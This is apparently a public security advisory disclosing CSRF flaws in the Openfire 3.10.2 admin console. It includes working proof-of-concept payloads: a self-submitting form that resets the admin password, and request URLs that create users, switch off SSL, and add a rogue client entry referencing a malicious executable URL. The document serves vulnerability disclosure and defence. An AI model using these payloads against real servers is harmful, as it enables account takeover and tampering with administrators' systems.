@@ -1,0 +1,140 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-OPENFIRE-CSRF.txt
+
+
+
+Vendor:
+================================
+www.igniterealtime.org/projects/openfire
+www.igniterealtime.org/downloads/index.jsp
+
+
+
+Product:
+================================
+Openfire 3.10.2
+
+Openfire is a real time collaboration (RTC) server licensed under the Open
+Source Apache License.
+It uses the only widely adopted open protocol for instant messaging, XMPP
+(also called Jabber).
+
+
+Vulnerability Type:
+=================================
+Cross site request forgery (CSRF)
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+
+
+Vulnerability Details:
+=====================
+No CSRF tokens exists allowing us to take malicious actions against the
+application.
+
+1- change admin password.
+
+2- add aribitrary users to the system
+
+3- edit server settings e.g. turn off SSL.
+
+4- Add rogue malicious clients with permit access (Allow all XMPP clients
+to connect)
+
+and more...
+
+
+
+Exploit code(s):
+===============
+
+1) change admin password
+
+<script>
+function doit(){
+var e=document.getElementById('HELL')
+e.submit()
+}
+</script>
+
+<form id="HELL" action="http://localhost:9090/user-password.jsp"
+method="post">
+<input type="text" name="username" value="admin" >
+<input type="text" name="password" value="abc123">
+<input type="text" name="passwordConfirm" value="abc123" >
+<input type="password" name="update" value="Update+Password" >
+</form>
+
+
+2) add aribitrary users
+http://localhost:9090/user-create.jsp?username=hyp3rlinx&name=hyp3rlinx&email=blasphemer@abyss.com&password=abc123&passwordConfirm=abc123&create=Create+User
+
+
+3) edit server settings & turn off SSL
+http://localhost:9090/server-props.jsp?serverName=myserver&sslEnabled=false&save=Save+Properties
+
+
+4) add rogue malicious clients
+http://localhost:9090/plugins/clientcontrol/permitted-clients.jsp?all=false&other=http%3A//maliciouso.com/666.exe&addOther=Add
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification:  NA
+Sept 14, 2015  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+]  POST & GET
+
+
+Vulnerable Product:             [+]  Openfire 3.10.2
+
+
+Vulnerable Parameter(s):        [+]  update, create, sslEnabled, other
+
+
+Affected Area(s):               [+]  Admin
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
